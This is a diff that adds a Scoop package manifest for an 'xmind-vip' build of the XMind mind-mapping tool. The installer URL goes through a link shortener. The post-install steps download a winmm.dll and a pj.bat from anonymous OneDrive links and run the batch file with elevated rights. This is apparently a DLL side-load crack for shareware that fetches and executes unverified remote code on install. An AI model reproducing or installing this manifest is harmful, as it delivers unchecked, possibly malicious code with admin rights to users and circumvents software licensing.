@@ -1,0 +1,31 @@
+{
+    "version": "22.11.3",
+    "description": "A full-featured mind mapping and brainstorming tool",
+    "homepage": "https://xmind.app/",
+    "license": {
+        "identifier": "Shareware",
+        "url": "https://xmind.app/terms/"
+    },
+    "architecture": {
+        "64bit": {
+            "url": "https://tinyurl.com/2navzb3c/xmind.exe#/dl.7z",
+            "hash": "7ce976ef8eedd2b3ac701521a0ceb6a89f5f3b88c5b67f12a0974b88b9b027d2",
+            "installer": {
+                "script": "Expand-7zipArchive \"$dir\\`$PLUGINSDIR\\app-64.7z\" \"$dir\""
+            }
+        }
+    },
+    "post_install": [
+        "Remove-Item \"$dir\\`$*\", \"$dir\\Uninstall*\" -Recurse",
+        "cd $env:USERPROFILE\\scoop\\apps\\xmind-vip\\22.11.3",
+        "Invoke-WebRequest -Uri \"https://igdzwq.by.files.1drv.com/y4m-TC4COgTAfTOAtchwmo87WL6w2iw_7JMCuhvcftzyJN9l8yq7JY8VbjtaM3g3B0a8qADRqj16-quUTEoSmLlpTNxT5aEWqzqJ5Y-NQGN1FXeW7nTn4dVb-z6SpX7_ifDtFiDvgJAsoCrX_WHiC2l9hTSMDMDOAipp12b505DQmxJCj1_8pUGwme6-Ks4guPlofKLZ02vnjvolz9kj9yxaQ\"-OutFile \"winmm.dll\"",
+        "Invoke-WebRequest -Uri \"https://igdzwq.by.files.1drv.com/y4mvf8LVM3A1BcUmKTXVK9ihvV27Nyh2FWm-sDQ_lHqLTNnQNqZHDDF2xvED1dahrVp8Rhph2r8PpnNkIsMNZmryJVckzYYf8P7qlYJ7-H8vbwG2m8WC5aDdEMjePIapmYzjQGR7FyOaLjy7JoIDaUqbs0NCm5PMu2WQL5kTDTjVBl-sdP9qMkk5y7p13TFJjEVSGM3BrkXUwxBCdyV5Gk8gA\" -OutFile \"pj.bat\"",
+        "sudo & .\\pj.bat"
+    ],
+    "shortcuts": [
+        [
+            "XMind.exe",
+            "XMind"
+        ]
+    ]
+}
